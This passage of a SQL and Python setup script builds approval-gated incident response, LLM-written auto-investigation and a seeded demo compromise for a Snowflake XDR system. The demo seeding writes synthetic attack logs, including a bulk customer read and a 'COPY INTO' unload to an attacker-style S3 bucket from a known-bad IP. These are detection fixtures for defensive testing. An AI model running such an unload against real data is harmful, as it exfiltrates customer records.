-- ============================================================================
-- Snowflake XDR - Auto-investigation and approval-gated response (Phase 4)
-- ============================================================================
-- Response catalog (RESPONSE_ACTIONS), governed like every other autonomy:
--   automatic       add_ioc, raise_severity, open_ticket, start_hunt
--   approval        contain_snowflake_user: removes every granted role except PUBLIC
--                   from a Snowflake user and records exactly what was removed, so
--                   Undo restores it. It does NOT disable the user or revoke tokens.
--   recommendation  anything else destructive (disable user, revoke sessions/PATs,
--                   rotate keys): recorded as advice for a human, never executed.
--
-- Hard limits checked in SQL (not only in the UI), in the owner's-rights procedure:
--   * the target must be on RESPONSE_TARGET_ALLOWLIST (ships with only XDR_DEMO_COMPROMISED)
--   * the target must not hold ACCOUNTADMIN, SECURITYADMIN or ORGADMIN, and must not be
--     the calling user
--   * the run must exist, be for that target, and have been approved by a human
--
-- Demo: XDR_DEMO_COMPROMISED (TYPE = PERSON, no password, login disabled) holds two demo
-- roles. SEED_DEMO_COMPROMISE() writes a compromise story attributed to it (password
-- guessing then success, a 2M-row read, COPY INTO an external s3 URL); the Snowflake
-- pack detects it, correlation opens a P1 case, auto-investigation writes its notes and
-- requests containment, a human approves in Mission Control, the roles go, Undo restores them.
-- ============================================================================

USE DATABASE SNOWFLAKE_XDR;

-- ---------------------------------------------------------------------------
-- 1. Catalog and allowlist
-- ---------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS SNOWFLAKE_XDR.INCIDENTS.RESPONSE_ACTIONS (
    action_id    VARCHAR(64) PRIMARY KEY,
    name         VARCHAR(200),
    autonomy     VARCHAR(20),     -- automatic | approval | recommendation
    reversible   BOOLEAN,
    description  VARCHAR(1000)
);

MERGE INTO SNOWFLAKE_XDR.INCIDENTS.RESPONSE_ACTIONS t
USING (SELECT * FROM VALUES
    ('add_ioc',                'Add indicator to threat intel', 'automatic', TRUE, 'Adds the attacker IP / domain as a local IOC so every rule sees it.'),
    ('raise_severity',         'Raise case severity',           'automatic', TRUE, 'Escalates the case priority when the investigation finds more.'),
    ('open_ticket',            'Open a ticket',                 'automatic', TRUE, 'Creates a Jira / ServiceNow / demo ticket for the case.'),
    ('start_hunt',             'Start a hunt',                  'automatic', TRUE, 'Runs the AI hunting agent on the case entities.'),
    ('contain_snowflake_user', 'Contain Snowflake user (strip roles to PUBLIC)', 'approval', TRUE,
     'Revokes every granted role except PUBLIC from an allowlisted Snowflake user and records them for exact undo. Does not disable the user or revoke tokens.'),
    ('disable_snowflake_user', 'Disable Snowflake user',        'recommendation', TRUE, 'ALTER USER ... SET DISABLED = TRUE. Recommended to a human only.'),
    ('revoke_user_credentials','Revoke sessions, PATs and keys','recommendation', FALSE, 'Kills sessions and removes PATs / RSA keys. Recommended to a human only.')
    AS v(action_id, name, autonomy, reversible, description)) s
ON t.action_id = s.action_id
WHEN MATCHED THEN UPDATE SET name = s.name, autonomy = s.autonomy, reversible = s.reversible, description = s.description
WHEN NOT MATCHED THEN INSERT VALUES (s.action_id, s.name, s.autonomy, s.reversible, s.description);

CREATE TABLE IF NOT EXISTS SNOWFLAKE_XDR.INCIDENTS.RESPONSE_TARGET_ALLOWLIST (
    user_name   VARCHAR(255) PRIMARY KEY,
    reason      VARCHAR(500),
    added_by    VARCHAR(255) DEFAULT CURRENT_USER(),
    added_at    TIMESTAMP_LTZ DEFAULT CURRENT_TIMESTAMP()
);

MERGE INTO SNOWFLAKE_XDR.INCIDENTS.RESPONSE_TARGET_ALLOWLIST t
USING (SELECT 'XDR_DEMO_COMPROMISED' AS u) s ON t.user_name = s.u
WHEN NOT MATCHED THEN INSERT (user_name, reason) VALUES (s.u, 'dedicated demo target for contain_snowflake_user');

-- ---------------------------------------------------------------------------
-- 2. Dedicated demo user, roles and data
-- ---------------------------------------------------------------------------
CREATE SCHEMA IF NOT EXISTS SNOWFLAKE_XDR.DEMO_FINANCE COMMENT = 'Demo data the XDR_DEMO_COMPROMISED story reads';
CREATE TABLE IF NOT EXISTS SNOWFLAKE_XDR.DEMO_FINANCE.CUSTOMERS AS
SELECT SEQ4() AS customer_id, 'customer_' || SEQ4() AS name, UNIFORM(1000, 99999, RANDOM()) AS balance
FROM TABLE(GENERATOR(ROWCOUNT => 1000));

CREATE ROLE IF NOT EXISTS XDR_DEMO_ANALYST_ROLE COMMENT = 'Demo: read access to DEMO_FINANCE (contain_snowflake_user target)';
CREATE ROLE IF NOT EXISTS XDR_DEMO_REPORTING_ROLE COMMENT = 'Demo: second role, shows that undo restores every grant';
GRANT USAGE ON DATABASE SNOWFLAKE_XDR TO ROLE XDR_DEMO_ANALYST_ROLE;
GRANT USAGE ON SCHEMA SNOWFLAKE_XDR.DEMO_FINANCE TO ROLE XDR_DEMO_ANALYST_ROLE;
GRANT SELECT ON TABLE SNOWFLAKE_XDR.DEMO_FINANCE.CUSTOMERS TO ROLE XDR_DEMO_ANALYST_ROLE;

CREATE USER IF NOT EXISTS XDR_DEMO_COMPROMISED
    TYPE = PERSON
    DISABLED = TRUE
    DEFAULT_ROLE = XDR_DEMO_ANALYST_ROLE
    COMMENT = 'XDR demo: synthetic compromised user. No password, login disabled. Only allowed contain_snowflake_user target.';
GRANT ROLE XDR_DEMO_ANALYST_ROLE TO USER XDR_DEMO_COMPROMISED;
GRANT ROLE XDR_DEMO_REPORTING_ROLE TO USER XDR_DEMO_COMPROMISED;

-- ---------------------------------------------------------------------------
-- 3. The containment action (owner's rights: the caller needs no grant privileges)
-- ---------------------------------------------------------------------------
CREATE OR REPLACE PROCEDURE SNOWFLAKE_XDR.INCIDENTS.CONTAIN_SNOWFLAKE_USER(P_USER VARCHAR, P_RUN_ID VARCHAR)
RETURNS VARIANT
LANGUAGE PYTHON
RUNTIME_VERSION = '3.11'
PACKAGES = ('snowflake-snowpark-python')
HANDLER = 'main'
EXECUTE AS OWNER
AS
$$
import json
import re

DB = "SNOWFLAKE_XDR"
NAME_RE = re.compile(r"^[A-Z0-9_$]{1,255}$")
PROTECTED = {"ACCOUNTADMIN", "SECURITYADMIN", "ORGADMIN"}


def refuse(s, run_id, msg):
    if run_id:
        s.sql(f"""UPDATE {DB}.INCIDENTS.RESPONSE_ACTION_RUNS SET status = 'failed', result = OBJECT_CONSTRUCT('error', ?),
                  updated_at = CURRENT_TIMESTAMP() WHERE run_id = ? AND status = 'approved'""", params=[msg, run_id]).collect()
    return {"ok": False, "message": "refused: " + msg}


def user_roles(s, user):
    return [r["role"] for r in [x.as_dict() for x in s.sql(f'SHOW GRANTS TO USER "{user}"').collect()]
            if r.get("granted_to", "USER") == "USER"]


def main(s, P_USER, P_RUN_ID):
    user = (P_USER or "").strip().upper()
    if not NAME_RE.match(user):
        return refuse(s, P_RUN_ID, "invalid user name")
    run = s.sql(f"""SELECT action_id, target, status FROM {DB}.INCIDENTS.RESPONSE_ACTION_RUNS WHERE run_id = ?""",
                params=[P_RUN_ID or ""]).collect()
    if not run or run[0]["ACTION_ID"] != "contain_snowflake_user" or run[0]["TARGET"].upper() != user:
        return refuse(s, None, "no response run for this user")
    if run[0]["STATUS"] != "approved":
        return refuse(s, None, f"run is {run[0]['STATUS']}, it must be approved by a human first")
    if not s.sql(f"SELECT 1 FROM {DB}.INCIDENTS.RESPONSE_TARGET_ALLOWLIST WHERE UPPER(user_name) = ?",
                 params=[user]).collect():
        return refuse(s, P_RUN_ID, f"{user} is not on RESPONSE_TARGET_ALLOWLIST")
    caller = s.sql("SELECT CURRENT_USER() AS u").collect()[0]["U"].upper()
    if user == caller:
        return refuse(s, P_RUN_ID, "cannot contain the calling user")
    try:
        roles = user_roles(s, user)
    except Exception as e:
        return refuse(s, P_RUN_ID, "user not found or grants unreadable: " + str(e)[:200])
    held = PROTECTED.intersection(r.upper() for r in roles)
    if held:
        return refuse(s, P_RUN_ID, f"{user} holds {', '.join(sorted(held))}; admins are never contained automatically")
    removed, errors = [], []
    for role in roles:
        if role.upper() == "PUBLIC" or not NAME_RE.match(role.upper()):
            continue
        try:
            s.sql(f'REVOKE ROLE "{role}" FROM USER "{user}"').collect()
            removed.append(role)
        except Exception as e:
            errors.append({"role": role, "error": str(e)[:200]})
    after = user_roles(s, user)
    result = {"removed_roles": removed, "remaining_roles": after, "errors": errors}
    s.sql(f"""UPDATE {DB}.INCIDENTS.RESPONSE_ACTION_RUNS SET status = ?, executed_at = CURRENT_TIMESTAMP(),
                undo_state = PARSE_JSON(?), result = PARSE_JSON(?), updated_at = CURRENT_TIMESTAMP() WHERE run_id = ?""",
          params=["executed" if not errors else "failed", json.dumps({"user": user, "roles": removed}),
                  json.dumps(result), P_RUN_ID]).collect()
    return {"ok": not errors, "message": f"{user} contained: removed {', '.join(removed) or 'no roles'}; "
                                         f"remaining {', '.join(after) or 'none'}", **result}
$$;

CREATE OR REPLACE PROCEDURE SNOWFLAKE_XDR.INCIDENTS.UNDO_RESPONSE_ACTION(P_RUN_ID VARCHAR, P_ACTOR VARCHAR)
RETURNS VARIANT
LANGUAGE PYTHON
RUNTIME_VERSION = '3.11'
PACKAGES = ('snowflake-snowpark-python')
HANDLER = 'main'
EXECUTE AS OWNER
AS
$$
import json
import re

DB = "SNOWFLAKE_XDR"
NAME_RE = re.compile(r"^[A-Z0-9_$]{1,255}$")


def main(s, P_RUN_ID, P_ACTOR):
    r = s.sql(f"""SELECT action_id, status, undo_state, incident_id FROM {DB}.INCIDENTS.RESPONSE_ACTION_RUNS
                  WHERE run_id = ?""", params=[P_RUN_ID or ""]).collect()
    if not r:
        return {"ok": False, "message": "response run not found"}
    run = r[0].as_dict()
    if run["STATUS"] != "executed" or run["ACTION_ID"] != "contain_snowflake_user":
        return {"ok": False, "message": f"nothing to undo (status {run['STATUS']})"}
    st = json.loads(run["UNDO_STATE"]) if isinstance(run["UNDO_STATE"], str) else run["UNDO_STATE"]
    user = str(st.get("user", "")).upper()
    if not NAME_RE.match(user) or not s.sql(f"SELECT 1 FROM {DB}.INCIDENTS.RESPONSE_TARGET_ALLOWLIST WHERE UPPER(user_name) = ?",
                                             params=[user]).collect():
        return {"ok": False, "message": "undo refused: target not on the allowlist"}
    restored = []
    for role in st.get("roles") or []:
        if NAME_RE.match(str(role).upper()):
            s.sql(f'GRANT ROLE "{role}" TO USER "{user}"').collect()
            restored.append(role)
    who = P_ACTOR or s.sql("SELECT CURRENT_USER() AS u").collect()[0]["U"]
    s.sql(f"""UPDATE {DB}.INCIDENTS.RESPONSE_ACTION_RUNS SET status = 'undone', decided_by = COALESCE(decided_by, ?),
                result = OBJECT_INSERT(COALESCE(result, OBJECT_CONSTRUCT()), 'undone', OBJECT_CONSTRUCT('by', ?, 'restored', PARSE_JSON(?), 'at', CURRENT_TIMESTAMP()::VARCHAR), TRUE),
                updated_at = CURRENT_TIMESTAMP() WHERE run_id = ?""",
          params=[who, who, json.dumps(restored), P_RUN_ID]).collect()
    if run["INCIDENT_ID"]:
        s.sql(f"""INSERT INTO {DB}.INCIDENTS.INCIDENT_EVENTS (incident_id, event_type, actor, actor_type, to_value, detail, source_system)
                  SELECT ?, 'response_undone', ?, 'human', 'contain_snowflake_user', OBJECT_CONSTRUCT('restored', PARSE_JSON(?)), 'xdr'""",
              params=[run["INCIDENT_ID"], who, json.dumps(restored)]).collect()
    return {"ok": True, "message": f"restored {', '.join(restored) or 'nothing'} to {user}"}
$$;

-- ---------------------------------------------------------------------------
-- 4. Request and decide
--    REQUEST_RESPONSE_ACTION: automatic actions run now (unless the kill switch is on),
--    approval actions wait for a human, recommendations are recorded as advice.
-- ---------------------------------------------------------------------------
CREATE OR REPLACE PROCEDURE SNOWFLAKE_XDR.INCIDENTS.REQUEST_RESPONSE_ACTION(
    P_ACTION VARCHAR, P_TARGET VARCHAR, P_INCIDENT_ID VARCHAR, P_REASON VARCHAR, P_REQUESTED_BY VARCHAR, P_TYPE VARCHAR)
RETURNS VARIANT
LANGUAGE SQL
EXECUTE AS CALLER
AS
$$
DECLARE
    v_autonomy VARCHAR;
    v_run VARCHAR := UUID_STRING();
    v_type VARCHAR := IFF(LOWER(:P_TYPE) IN ('human', 'agent', 'autopilot'), LOWER(:P_TYPE), 'agent');
    v_open NUMBER;
BEGIN
    SELECT MAX(autonomy) INTO :v_autonomy FROM SNOWFLAKE_XDR.INCIDENTS.RESPONSE_ACTIONS WHERE action_id = :P_ACTION;
    IF (v_autonomy IS NULL) THEN
        RETURN OBJECT_CONSTRUCT('ok', FALSE, 'message', 'unknown response action ' || COALESCE(:P_ACTION, ''));
    END IF;
    SELECT COUNT(*) INTO :v_open FROM SNOWFLAKE_XDR.INCIDENTS.RESPONSE_ACTION_RUNS
     WHERE action_id = :P_ACTION AND UPPER(target) = UPPER(:P_TARGET) AND status IN ('pending_approval', 'executed');
    IF (v_open > 0) THEN
        RETURN OBJECT_CONSTRUCT('ok', TRUE, 'message', :P_ACTION || ' on ' || :P_TARGET || ' is already pending or in effect');
    END IF;
    IF (v_autonomy = 'automatic' AND v_type <> 'human' AND SNOWFLAKE_XDR.DETECTIONS.AUTONOMY_PAUSED()) THEN
        RETURN OBJECT_CONSTRUCT('ok', FALSE, 'message', 'autonomy is paused: automatic response not run');
    END IF;
    INSERT INTO SNOWFLAKE_XDR.INCIDENTS.RESPONSE_ACTION_RUNS
        (run_id, action_id, incident_id, target, status, reason, requested_by, requested_by_type)
    VALUES (:v_run, :P_ACTION, NULLIF(:P_INCIDENT_ID, ''), :P_TARGET,
            CASE :v_autonomy WHEN 'approval' THEN 'pending_approval' WHEN 'recommendation' THEN 'recommended' ELSE 'executed' END,
            LEFT(:P_REASON, 2000), COALESCE(:P_REQUESTED_BY, CURRENT_USER()), :v_type);
    IF (NULLIF(:P_INCIDENT_ID, '') IS NOT NULL) THEN
        INSERT INTO SNOWFLAKE_XDR.INCIDENTS.INCIDENT_EVENTS (incident_id, event_type, actor, actor_type, to_value, detail, source_system)
        SELECT :P_INCIDENT_ID, 'response_requested', COALESCE(:P_REQUESTED_BY, CURRENT_USER()), :v_type, :P_ACTION,
               OBJECT_CONSTRUCT('target', :P_TARGET, 'run_id', :v_run, 'autonomy', :v_autonomy, 'reason', LEFT(:P_REASON, 500)), 'xdr';
    END IF;
    RETURN OBJECT_CONSTRUCT('ok', TRUE, 'run_id', :v_run, 'autonomy', :v_autonomy,
        'message', CASE :v_autonomy WHEN 'approval' THEN :P_ACTION || ' on ' || :P_TARGET || ' is waiting for approval in Mission Control'
                                   WHEN 'recommendation' THEN :P_ACTION || ' recorded as a recommendation for a human'
                                   ELSE :P_ACTION || ' recorded' END);
END;
$$;

CREATE OR REPLACE PROCEDURE SNOWFLAKE_XDR.INCIDENTS.DECIDE_RESPONSE_ACTION(
    P_RUN_ID VARCHAR, P_DECISION VARCHAR, P_NOTE VARCHAR, P_ACTOR VARCHAR)
RETURNS VARIANT
LANGUAGE SQL
EXECUTE AS CALLER
AS
$$
DECLARE
    v_status VARCHAR;
    v_action VARCHAR;
    v_target VARCHAR;
    v_incident VARCHAR;
    v_who VARCHAR := COALESCE(:P_ACTOR || ' (console)', CURRENT_USER());
    r VARIANT;
    v_set VARIANT;
BEGIN
    SELECT MAX(status), MAX(action_id), MAX(target), MAX(incident_id) INTO :v_status, :v_action, :v_target, :v_incident
    FROM SNOWFLAKE_XDR.INCIDENTS.RESPONSE_ACTION_RUNS WHERE run_id = :P_RUN_ID;
    IF (v_status IS NULL) THEN
        RETURN OBJECT_CONSTRUCT('ok', FALSE, 'message', 'response run not found');
    END IF;
    IF (v_status <> 'pending_approval') THEN
        RETURN OBJECT_CONSTRUCT('ok', FALSE, 'message', 'run is ' || v_status || ', not waiting for approval');
    END IF;
    IF (LOWER(:P_DECISION) = 'reject') THEN
        UPDATE SNOWFLAKE_XDR.INCIDENTS.RESPONSE_ACTION_RUNS SET status = 'rejected', decided_by = :v_who,
               decided_at = CURRENT_TIMESTAMP(), reason = reason || COALESCE(' | rejected: ' || :P_NOTE, ''),
               updated_at = CURRENT_TIMESTAMP() WHERE run_id = :P_RUN_ID;
        r := OBJECT_CONSTRUCT('ok', TRUE, 'message', v_action || ' on ' || v_target || ' rejected');
    ELSEIF (LOWER(:P_DECISION) = 'approve') THEN
        UPDATE SNOWFLAKE_XDR.INCIDENTS.RESPONSE_ACTION_RUNS SET status = 'approved', decided_by = :v_who,
               decided_at = CURRENT_TIMESTAMP(), updated_at = CURRENT_TIMESTAMP() WHERE run_id = :P_RUN_ID;
        IF (v_action = 'contain_snowflake_user') THEN
            CALL SNOWFLAKE_XDR.INCIDENTS.CONTAIN_SNOWFLAKE_USER(:v_target, :P_RUN_ID) INTO :r;
        ELSE
            r := OBJECT_CONSTRUCT('ok', FALSE, 'message', 'no executor for ' || v_action);
        END IF;
    ELSE
        RETURN OBJECT_CONSTRUCT('ok', FALSE, 'message', 'decision must be approve or reject');
    END IF;
    IF (v_incident IS NOT NULL) THEN
        INSERT INTO SNOWFLAKE_XDR.INCIDENTS.INCIDENT_EVENTS (incident_id, event_type, actor, actor_type, to_value, detail, source_system)
        SELECT :v_incident, 'response_' || LOWER(:P_DECISION), :v_who, 'human', :v_action, :r, 'xdr';
        IF (LOWER(:P_DECISION) = 'approve' AND r:ok::BOOLEAN) THEN
            CALL SNOWFLAKE_XDR.INCIDENTS.SET_INCIDENT_STATE(:v_incident, 'contained', 'contain_snowflake_user executed: ' || :v_target,
                                                           :v_who, 'human', NULL, NULL) INTO :v_set;
        END IF;
    END IF;
    RETURN r;
END;
$$;

-- ---------------------------------------------------------------------------
-- 5. Auto-investigation (P1/P2 or high-confidence cases)
--    Pivots, timeline, blast radius, Trust Center findings and intel on the case
--    entities; Cortex writes the note from those facts only. Posted as the agent,
--    then the incident report is drafted and containment is requested when the
--    primary entity is an allowlisted Snowflake user.
-- ---------------------------------------------------------------------------
CREATE OR REPLACE PROCEDURE SNOWFLAKE_XDR.INCIDENTS.AUTO_INVESTIGATE(P_INCIDENT_ID VARCHAR)
RETURNS VARIANT
LANGUAGE PYTHON
RUNTIME_VERSION = '3.11'
PACKAGES = ('snowflake-snowpark-python')
HANDLER = 'main'
EXECUTE AS CALLER
AS
$$
import ipaddress
import json

DB = "SNOWFLAKE_XDR"
AGENT = "xdr_agent"


def rows(s, sql, params=None):
    return [r.as_dict() for r in s.sql(sql, params=params).collect()]


def one(s, sql, params=None):
    r = rows(s, sql, params)
    return r[0] if r else None


def safe(fn, default):
    try:
        return fn()
    except Exception as e:
        return {"unavailable": str(e)[:150]} if default is None else default


def public_ip(v):
    try:
        return ipaddress.ip_address(str(v).strip()).is_global
    except ValueError:
        return False


def investigate(s, iid):
    inc = one(s, f"SELECT * FROM {DB}.INCIDENTS.INCIDENTS WHERE incident_id = ?", [iid])
    if not inc:
        return {"ok": False, "message": "incident not found"}
    findings = rows(s, f"""SELECT f.rule_id, f.description, f.severity, f.user_name, f.src, f.dest, f.event_time,
                                  f.mitre_technique_id, f.conf_band
                           FROM {DB}.INCIDENTS.INCIDENT_FINDINGS x JOIN {DB}.DETECTIONS.DETECTION_FINDINGS f
                             ON f.finding_id = x.finding_id WHERE x.incident_id = ? ORDER BY f.event_time""", [iid])
    ents = sorted({v for f in findings for v in (f["USER_NAME"], f["SRC"], f["DEST"]) if v} | {inc["PRIMARY_ENTITY"] or ""} - {""})
    ent_json = json.dumps([e.lower() for e in ents])
    pivots = rows(s, f"""SELECT rule_id, COUNT(*) AS n, MIN(event_time) AS first, MAX(event_time) AS last
                         FROM {DB}.DETECTIONS.DETECTION_FINDINGS
                         WHERE ARRAYS_OVERLAP(PARSE_JSON(?), ARRAY_CONSTRUCT_COMPACT(LOWER(user_name), LOWER(src), LOWER(dest)))
                           AND event_time > DATEADD('day', -7, CURRENT_TIMESTAMP())
                           AND (incident_id IS NULL OR incident_id <> ?)
                         GROUP BY 1 ORDER BY n DESC LIMIT 15""", [ent_json, iid])
    blast = safe(lambda: rows(s, f"""SELECT dst_entity, edge_type, COUNT(*) AS n FROM {DB}.DETECTIONS.ATTACK_PATH_EDGES
                                     WHERE LOWER(src_entity) IN (SELECT LOWER(value::VARCHAR) FROM TABLE(FLATTEN(PARSE_JSON(?))))
                                       AND _time > DATEADD('day', -7, CURRENT_TIMESTAMP())
                                     GROUP BY 1, 2 ORDER BY n DESC LIMIT 15""", [ent_json]), [])
    tc = rows(s, f"""SELECT DISTINCT f.rule_id, f.description FROM {DB}.DETECTIONS.DETECTION_FINDINGS f,
                            LATERAL FLATTEN(INPUT => f.affected_entities) e
                     WHERE f.detection_source = 'trust_center'
                       AND LOWER(e.value:entity_name::VARCHAR) IN (SELECT LOWER(value::VARCHAR) FROM TABLE(FLATTEN(PARSE_JSON(?))))
                     LIMIT 10""", [ent_json])
    intel = rows(s, f"""SELECT ioc_value, ioc_type, confidence, source, status FROM {DB}.REFERENCE.THREAT_INTEL_IOCS
                        WHERE LOWER(ioc_value) IN (SELECT LOWER(value::VARCHAR) FROM TABLE(FLATTEN(PARSE_JSON(?))))
                        LIMIT 10""", [ent_json])
    activity = rows(s, f"""SELECT _time, action, query_type, LEFT(query_text, 160) AS q, rows_affected, src
                           FROM {DB}.RAW_LOGS.DATABASE_ACTIVITY
                           WHERE LOWER(user_name) IN (SELECT LOWER(value::VARCHAR) FROM TABLE(FLATTEN(PARSE_JSON(?))))
                             AND _time > DATEADD('day', -2, CURRENT_TIMESTAMP()) ORDER BY _time DESC LIMIT 15""", [ent_json])
    facts = {"incident": {k: inc[k] for k in ("TITLE", "PRIORITY", "SEVERITY", "PRIMARY_ENTITY", "STATUS")},
             "findings": findings, "related_findings_7d": pivots, "blast_radius": blast,
             "trust_center": tc, "intel": intel, "recent_database_activity": activity,
             # what is unusual for these entities against their own 30-day baseline (setup/47_ueba.sql)
             "behaviour_anomalies": safe(lambda: rows(s, f"""SELECT entity, kind, score, detail, event_time
                 FROM {DB}.DETECTIONS.UEBA_ANOMALIES
                 WHERE LOWER(entity) IN (SELECT LOWER(value::VARCHAR) FROM TABLE(FLATTEN(PARSE_JSON(?))))
                   AND event_time > DATEADD('day', -3, CURRENT_TIMESTAMP()) ORDER BY score DESC LIMIT 15""", [ent_json]), [])}
    model = (one(s, f"SELECT value::VARCHAR AS m FROM {DB}.DETECTIONS.AUTOPILOT_SETTINGS WHERE setting = 'model'")
             or {"M": "claude-sonnet-4-5"})["M"]
    prompt = ("You are a SOC analyst. Write an investigation note for this case using ONLY the facts below. "
              "Sections: What happened (timeline), Scope (entities, blast radius), Corroboration (Trust Center, intel, "
              "related detections, behaviour anomalies vs the entity's own baseline), Assessment (true positive likelihood and why), Recommended next steps. "
              "Plain text, under 300 words, no speculation beyond the facts.\nFACTS:\n"
              + json.dumps(facts, default=str)[:24000])
    note = one(s, "SELECT SNOWFLAKE.CORTEX.COMPLETE(?, ?) AS r", [model, prompt])["R"] or ""
    s.sql(f"CALL {DB}.INCIDENTS.ADD_INCIDENT_COMMENT(?, ?, ?, 'agent', 'xdr')",
          params=[iid, ("Auto-investigation\n\n" + note.strip())[:8000], AGENT]).collect()
    s.sql(f"""INSERT INTO {DB}.INCIDENTS.INCIDENT_EVENTS (incident_id, event_type, actor, actor_type, detail, source_system)
              SELECT ?, 'auto_investigation', ?, 'agent', PARSE_JSON(?), 'xdr'""",
          params=[iid, AGENT, json.dumps({"entities": ents, "findings": len(findings), "related_rules": len(pivots),
                                          "blast_radius": len(blast) if isinstance(blast, list) else 0,
                                          "trust_center": len(tc), "intel_hits": len(intel)}, default=str)]).collect()
    report = safe(lambda: list(one(s, f"CALL {DB}.INCIDENTS.GENERATE_INCIDENT_REPORT(?, ?)", [iid, AGENT]).values())[0], None)
    requested = []
    # Playbook (V_RESPONSE_OPTIONS, setup/44): the right action for each allowlisted entity - Snowflake user,
    # Okta/Entra identity (matched on the full address or its local part) or EDR host - and an automatic,
    # reversible IOC block for public attacker IPs seen in the findings
    for e in ents:
        opt = safe(lambda: one(s, f"""SELECT action_id, target FROM {DB}.INCIDENTS.V_RESPONSE_OPTIONS
                                      WHERE action_id IS NOT NULL AND (UPPER(target) = UPPER(?)
                                         OR (target_kind = 'user' AND UPPER(SPLIT_PART(target, '@', 1)) = UPPER(?)))
                                      LIMIT 1""", [e, e]), None)
        if opt and opt.get("ACTION_ID"):
            r = one(s, f"CALL {DB}.INCIDENTS.REQUEST_RESPONSE_ACTION(?, ?, ?, ?, ?, 'agent')",
                    [opt["ACTION_ID"], opt["TARGET"], iid, f"Auto-investigation of {inc['PRIORITY']} case: {inc['TITLE']}"[:500], AGENT])
            requested.append(json.loads(list(r.values())[0]))
    for ip in sorted({f["SRC"] for f in findings if f["SRC"]} | {f["DEST"] for f in findings if f["DEST"]}):
        if public_ip(ip) and any(str(i["IOC_VALUE"]) == ip for i in intel):
            r = one(s, f"CALL {DB}.INCIDENTS.REQUEST_RESPONSE_ACTION('block_ioc', ?, ?, ?, ?, 'agent')",
                    [ip, iid, "Known-bad IP in this case (threat intel match)", AGENT])
            requested.append(json.loads(list(r.values())[0]))
    return {"ok": True, "incident_id": iid, "entities": ents, "findings": len(findings), "related": len(pivots),
            "trust_center": len(tc), "intel": len(intel), "report": bool(report), "response_requests": requested,
            "message": f"investigated {iid}: note posted, report drafted"
                       + (f", containment requested for approval" if requested else "")}


def main(s, P_INCIDENT_ID):
    if P_INCIDENT_ID and P_INCIDENT_ID.lower() != "new":
        return investigate(s, P_INCIDENT_ID)
    if one(s, f"SELECT {DB}.DETECTIONS.AUTONOMY_PAUSED() AS p")["P"]:
        return {"paused": True, "message": "autonomy is paused (kill switch)"}
    out = []
    for i in rows(s, f"""SELECT i.incident_id FROM {DB}.INCIDENTS.INCIDENTS i
                         WHERE i.status <> 'closed' AND i.created_at > DATEADD('day', -2, CURRENT_TIMESTAMP())
                           AND (i.priority IN ('P1', 'P2') OR EXISTS (
                                SELECT 1 FROM {DB}.INCIDENTS.INCIDENT_FINDINGS x
                                JOIN {DB}.DETECTIONS.DETECTION_FINDINGS f ON f.finding_id = x.finding_id
                                WHERE x.incident_id = i.incident_id AND f.conf_band = 'high'))
                           AND NOT EXISTS (SELECT 1 FROM {DB}.INCIDENTS.INCIDENT_EVENTS e
                                           WHERE e.incident_id = i.incident_id AND e.event_type = 'auto_investigation')
                         ORDER BY i.priority LIMIT 5"""):
        out.append(investigate(s, i["INCIDENT_ID"]))
    return {"investigated": out}
$$;

CREATE OR REPLACE TASK SNOWFLAKE_XDR.INCIDENTS.TASK_AUTO_INVESTIGATE
    WAREHOUSE = XDR_WH
    SCHEDULE = '15 MINUTE'
    COMMENT = 'Auto-investigate new P1/P2 and high-confidence cases'
AS
    CALL SNOWFLAKE_XDR.INCIDENTS.AUTO_INVESTIGATE('new');

-- ---------------------------------------------------------------------------
-- 6. The demo compromise story
-- ---------------------------------------------------------------------------
CREATE OR REPLACE PROCEDURE SNOWFLAKE_XDR.INCIDENTS.SEED_DEMO_COMPROMISE()
RETURNS VARIANT
LANGUAGE SQL
EXECUTE AS CALLER
AS
$$
DECLARE
    acct VARCHAR := CURRENT_ACCOUNT_NAME();
    v_rules VARIANT;
    v_inc VARIANT;
BEGIN
    -- 1. Password guessing from a VPS, then a successful login
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION (event_id, _time, action, app, authentication_method, authentication_service,
        dest, reason, signature, src, user_name, user_agent, vendor_account, vendor_product, source, sourcetype, index_name)
    SELECT 'demo:sflogin:' || UUID_STRING(), DATEADD('minute', -40 + SEQ4(), CURRENT_TIMESTAMP()), 'failure', 'snowflake',
           'PASSWORD', 'Snowflake', :acct, 'Incorrect username or password was specified.', 'LOGIN', '185.220.101.77',
           'XDR_DEMO_COMPROMISED', 'PYTHON_DRIVER 3.12.0', :acct, 'snowflake', 'demo', 'snowflake:login', 'demo'
    FROM TABLE(GENERATOR(ROWCOUNT => 6));
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION (event_id, _time, action, app, authentication_method, authentication_service,
        dest, signature, src, user_name, user_agent, vendor_account, vendor_product, source, sourcetype, index_name)
    SELECT 'demo:sflogin:' || UUID_STRING(), DATEADD('minute', -30, CURRENT_TIMESTAMP()), 'success', 'snowflake', 'PASSWORD',
           'Snowflake', :acct, 'LOGIN', '185.220.101.77', 'XDR_DEMO_COMPROMISED', 'PYTHON_DRIVER 3.12.0', :acct, 'snowflake',
           'demo', 'snowflake:login', 'demo';
    -- 2. Bulk read of the customer table, then 3. unload to an attacker bucket
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY (event_id, _time, action, user_name, user_role, src, dest, app,
        query_type, query_text, object, result, rows_affected, bytes, warehouse, vendor_account, vendor_product, lane, source,
        sourcetype, index_name, _raw)
    SELECT 'demo:sfquery:' || UUID_STRING(), DATEADD('minute', -25, CURRENT_TIMESTAMP()), 'select', 'XDR_DEMO_COMPROMISED',
           'XDR_DEMO_ANALYST_ROLE', '185.220.101.77', :acct, 'PythonConnector', 'SELECT',
           'SELECT * FROM SNOWFLAKE_XDR.DEMO_FINANCE.CUSTOMERS', 'SNOWFLAKE_XDR.DEMO_FINANCE', 'success', 2400000, 380000000,
           'XDR_WH', :acct, 'snowflake', 'demo', 'demo', 'snowflake:query', 'demo', OBJECT_CONSTRUCT('story', 'demo_compromise')
    UNION ALL
    SELECT 'demo:sfquery:' || UUID_STRING(), DATEADD('minute', -20, CURRENT_TIMESTAMP()), 'unload', 'XDR_DEMO_COMPROMISED',
           'XDR_DEMO_ANALYST_ROLE', '185.220.101.77', :acct, 'PythonConnector', 'UNLOAD',
           'COPY INTO ''s3://exfil-drop-7731/customers/'' FROM SNOWFLAKE_XDR.DEMO_FINANCE.CUSTOMERS', 'SNOWFLAKE_XDR.DEMO_FINANCE',
